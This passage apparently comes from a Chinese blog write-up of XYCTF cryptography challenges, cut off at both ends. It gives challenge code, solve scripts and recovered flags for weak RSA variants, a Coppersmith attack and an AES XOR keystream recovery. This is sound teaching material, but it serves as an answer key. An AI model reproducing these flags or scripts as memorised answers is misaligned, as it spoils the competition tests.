class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">b&#x27;XYCTF&#123;108376aa-c3ed-4e02-a915-47d9ea406612&#125;&#x27;</span></span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">leak=<span class="built_in">bin</span>(<span class="built_in">int</span>(flag))</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    leak += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(leak) == <span class="number">514</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bits</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str[<span class="number">2</span>:])</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        temp = input_list[i]</span><br><span class="line">        input_list[i] = input_list[length - <span class="number">1</span> - i]</span><br><span class="line">        input_list[length - <span class="number">1</span> - i] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line"></span><br><span class="line">input_str = leak</span><br><span class="line">result = swap_bits(input_str)</span><br><span class="line">a=result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_add</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str)</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        input_list[i] = <span class="built_in">str</span>((<span class="built_in">int</span>(input_list[i]) + i + <span class="number">1</span>) % <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = a</span><br><span class="line">result = custom_add(input_str)</span><br><span class="line">b=result</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment">#12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>既然是对每一位的单独加密，那就直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">llll   = <span class="number">12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(<span class="built_in">str</span>(input_str))</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> (input_list[i] == <span class="built_in">str</span>((k + i + <span class="number">1</span>) % <span class="number">10</span>)):</span><br><span class="line">                res+=(<span class="built_in">str</span>(k))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">nex = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(out(llll)))</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">nex = <span class="string">&#x27;0b&#x27;</span>+nex[:<span class="number">343</span>]</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">y = <span class="built_in">int</span>(nex,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(y))</span><br><span class="line"><span class="comment"># XYCTF&#123;f94e8256-6368-47bc-9ae3-c73e382376d7&#125;</span></span><br></pre></td></tr></table></figure><h4 id="x0r"><a href="#x0r" class="headerlink" title="x0r"></a>x0r</h4><p>是AES的选择明文攻击，由于是异或得到结果，那就可以直接截获每一次的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥块</span></span><br><span class="line"><span class="comment"># 输入1后得到的前32个字符和后96个字符</span></span><br><span class="line"><span class="comment"># 输入2后输入前32个字符，然后输入000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="comment"># 得到的输出放到这里</span></span><br><span class="line">key_blocks_hex = <span class="string">&#x27;69d174fb2dd82fc3ad184efde51b3a6673027ef1d3a49dbf955d2f62759b1a5924381fb190dd70c5957c7e395311272c&#x27;</span></span><br><span class="line">key_blocks = <span class="built_in">bytes</span>.fromhex(key_blocks_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line"><span class="comment"># 输入1后得到的前32个字符和后96个字符</span></span><br><span class="line"><span class="comment"># 放后96个字符</span></span><br><span class="line">ciphertext_hex = <span class="string">&#x27;318837af6ba319a69b7d78c9d67d175e11644bdce7c0ab88b83c1f0642b6783c175929d5a7be12a0f11f033357152328&#x27;</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">plaintext = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), AES.block_size):</span><br><span class="line">    key_block = key_blocks[i:i+AES.block_size]</span><br><span class="line">    ciphertext_block = ciphertext[i:i+AES.block_size]</span><br><span class="line">    plaintext_block = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext_block, key_block))</span><br><span class="line">    plaintext += plaintext_block</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="happy-to-solve1"><a href="#happy-to-solve1" class="headerlink" title="happy_to_solve1"></a>happy_to_solve1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = sympy.nextprime(p ^ ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p, q = get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>我们知道q是p异或11111…的结果，那么p+q就约等于2**512</p><p>我们可以根据这个和pq乘积两个等式尝试寻找p和q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">suma, mula</span>):</span><br><span class="line">    <span class="comment"># 设置精度</span></span><br><span class="line">    getcontext().prec = <span class="number">200</span></span><br><span class="line">    <span class="comment"># 计算判别式</span></span><br><span class="line">    discriminant = Decimal(suma**<span class="number">2</span> - <span class="number">4</span>*mula).sqrt()</span><br><span class="line">    <span class="comment"># 计算 p 和 q 的值</span></span><br><span class="line">    p = (suma + discriminant) / <span class="number">2</span></span><br><span class="line">    q = (suma - discriminant) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">suma = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">512</span>)-<span class="number">1</span></span><br><span class="line">mula = <span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line">n=<span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line"></span><br><span class="line">p, q = solve_pq(suma, mula)</span><br><span class="line"><span class="comment"># print(f&quot;p = &#123;Decimal(p):.2f&#125;, q = &#123;Decimal(q):.2f&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(sympy.nextprime(p))</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>((n%p)!=<span class="number">0</span>):</span><br><span class="line">        p = sympy.nextprime(p)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line">c = <span class="number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">phi =(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># XYCTF&#123;3f22f4efe3bbbc71bbcc999a0a622a1a23303cdc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="反方向的密码-相思"><a href="#反方向的密码-相思" class="headerlink" title="反方向的密码 相思"></a>反方向的密码 相思</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message + <span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment"># 120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"><span class="comment"># 143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相当于已知m低位，用Coppersmith定理可解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">n = <span class="number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line">c = <span class="number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">50</span>):</span><br><span class="line">    low = <span class="built_in">int</span>(hashlib.sha256(<span class="built_in">str</span>(i).encode()).hexdigest(), <span class="number">16</span>)</span><br><span class="line">    m = low + x*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    roots = (m**<span class="number">3</span> - c).monic().small_roots(X=<span class="number">2</span>**(i*<span class="number">8</span>),beta=<span class="number">0.4</span>,epsilon=<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        M = m(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(M))[:i])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># XYCTF&#123;!__d3ng__hu0__1@n__3h@n__Chu__!&#125;</span></span><br></pre></td></tr></table></figure><p>一开始怎么都爆不出来，结果发现是epsilon取大了，还没规定上下界（这个X&#x3D;X&#x3D;2**(i*8)就是确定为flag的长度的）,这样就要写m &#x3D; low + x*2**256。不然会撞上下界</p><h3 id="week2-1"><a href="#week2-1" class="headerlink" title="week2"></a>week2</h3><h4 id="Sign1n-Revenge"><a href="#Sign1n-Revenge" class="headerlink" title="Sign1n_Revenge"></a>Sign1n_Revenge</h4><p>和signin一样，不写了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">09</span>c24f8d-dbf8-<span class="number">463</span>b-a16f-<span class="number">3</span>dbc47e4a726&#125;</span><br></pre></td></tr></table></figure><h4 id="happy-to-solve2"><a href="#happy-to-solve2" class="headerlink" title="happy_to_solve2"></a>happy_to_solve2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;123&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;567&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">            <span class="keyword">return</span> (p,q)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p ,q= get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>这个p和q每一位既然只有3种选择，那就可以从最低位开始爆破出p和q的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 乘积n</span></span><br><span class="line">n = <span class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line">p_values = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>]</span><br><span class="line">q_values = [<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>]</span><br><span class="line"></span><br><span class="line">n_str = <span class="built_in">str</span>(n)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;&#x27;</span></span><br><span class="line">upone = <span class="number">0</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">p, i, digit</span>):</span><br><span class="line">    p_list = <span class="built_in">list</span>(p)</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(p_list):</span><br><span class="line">        p_list[<span class="number">0</span>] = digit</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p_list.insert(<span class="number">0</span>,digit)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(p_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p_q</span>(<span class="params">i, p, q</span>):</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span>)<span class="keyword">or</span>(<span class="built_in">int</span>(p)*<span class="built_in">int</span>(q)==n):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;p:&#x27;</span>, <span class="built_in">int</span>(p))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q:&#x27;</span>, <span class="built_in">int</span>(q))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    j = <span class="built_in">len</span>(n_str) -<span class="number">1</span> -i</span><br><span class="line">    <span class="keyword">for</span> p_val <span class="keyword">in</span> p_values:</span><br><span class="line">        new_p = <span class="built_in">set</span>(p, j, p_val)</span><br><span class="line">        <span class="keyword">for</span> q_val <span class="keyword">in</span> q_values:</span><br><span class="line">            new_q = <span class="built_in">set</span>(q, j, q_val)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">str</span>(<span class="built_in">int</span>(new_q)*<span class="built_in">int</span>(new_p))[-(<span class="number">1</span>+j)]) == n_str[i]:</span><br><span class="line">                <span class="keyword">if</span> find_p_q(i-<span class="number">1</span>, new_p, new_q): <span class="comment"># 向下一层</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># 否则向上一层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> find_p_q(<span class="built_in">len</span>(n_str)-<span class="number">1</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line">c = <span 